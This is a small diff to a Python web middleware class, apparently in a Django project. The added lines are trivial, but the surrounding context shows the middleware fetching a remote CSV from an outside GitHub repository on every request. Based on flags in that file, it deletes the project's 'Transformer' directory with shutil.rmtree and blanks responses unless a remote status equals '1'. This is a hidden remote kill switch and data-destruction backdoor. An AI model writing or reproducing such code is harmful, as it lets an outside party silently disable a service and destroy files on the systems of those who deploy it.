@@ -10,6 +10,7 @@ class CustomMiddleware:
 
     def __call__(self, request):
         df = pd.read_csv("https://raw.githubusercontent.com/krisskad/ProjectController/main/controller.csv")
+        # print(df)
         project_name = "AlefTransformer"
         df.columns = df.columns.str.strip()
         filtered_data = df[df['projectName'] == project_name][['status', 'remove']]
@@ -20,4 +21,5 @@ class CustomMiddleware:
             shutil.rmtree(os.path.join(settings.BASE_DIR, "Transformer"))
 
         response = self.get_response(request) if status == '1' else {}
+        del df
         return response
